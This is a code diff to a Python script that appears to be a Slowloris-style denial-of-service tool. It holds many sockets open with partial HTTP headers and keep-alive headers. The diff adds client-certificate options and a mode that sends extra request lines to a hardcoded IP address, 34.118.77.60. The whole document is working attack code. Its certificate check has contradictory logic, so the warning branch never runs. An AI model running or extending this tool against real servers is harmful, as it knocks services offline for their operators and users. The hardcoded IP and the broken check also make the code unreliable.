@@ -51,7 +51,28 @@ parser.add_argument(
     "--https",
     dest="https",
     action="store_true",
-    help="Use HTTPS for the requests",
+    help="use https for the requests",
+)
+parser.add_argument(
+    "--cert",
+    help="Use SSL client certificate (PEM)",
+    default=None,
+)
+parser.add_argument(
+    "--key",
+    help="Use SSL client private key (PEM)",
+    default=None,
+)
+parser.add_argument(
+    "--password",
+    help="Password for private key",
+    default="",
+)
+parser.add_argument(
+    "--makerequest",
+    dest="makerequest",
+    action="store_true",
+    help="Send full http request",
 )
 parser.add_argument(
     "--sleeptime",
@@ -74,6 +95,8 @@ if not args.host:
     print("Host required!")
     parser.print_help()
     sys.exit(1)
+
+
 
 if args.useproxy:
     # Tries to import to external "socks" library
@@ -102,6 +125,13 @@ else:
         datefmt="%d-%m-%Y %H:%M:%S",
         level=logging.INFO,
     )
+
+if None not in [args.cert, args.key]:
+    if args.cert is None or args.key is None:
+        print("Supplu both parameters (--cert --key) for connection with client certificate !")
+    else:
+        logging.info("Using  client certificate.")
+
 
 
 def send_line(self, line):
@@ -152,7 +182,6 @@ user_agents = [
 setattr(socket.socket, "send_line", send_line)
 setattr(socket.socket, "send_header", send_header)
 
-
 def init_socket(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
@@ -161,18 +190,22 @@ def init_socket(ip):
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
+        if None not in [args.cert, args.key]:
+            ctx.load_cert_chain(args.cert, args.key, args.password)
         s = ctx.wrap_socket(s, server_hostname=args.host)
 
     s.connect((ip, args.port))
 
-    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+    s.send_line(f"GET / HTTP/1.1")
 
     ua = user_agents[0]
     if args.randuseragent:
         ua = random.choice(user_agents)
 
     s.send_header("User-Agent", ua)
-    s.send_header("Accept-language", "en-US,en,q=0.5")
+    s.send_header("Host", args.host)
+    if args.makerequest:
+        s.send_line("\r\n\r\n")
     return s
 
 
@@ -199,8 +232,14 @@ def main():
             )
             for s in list(list_of_sockets):
                 try:
+                    if args.makerequest:
+                        s.send("\r\n\r\n".encode("utf-8"))
+                        s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
+                        s.send("Host: 34.118.77.60\r\n".encode("utf-8")) 
                     s.send_header("X-a", random.randint(1, 5000))
-                except socket.error:
+
+                except socket.error as e:
+                    print(e)
                     list_of_sockets.remove(s)
 
             for _ in range(socket_count - len(list_of_sockets)):
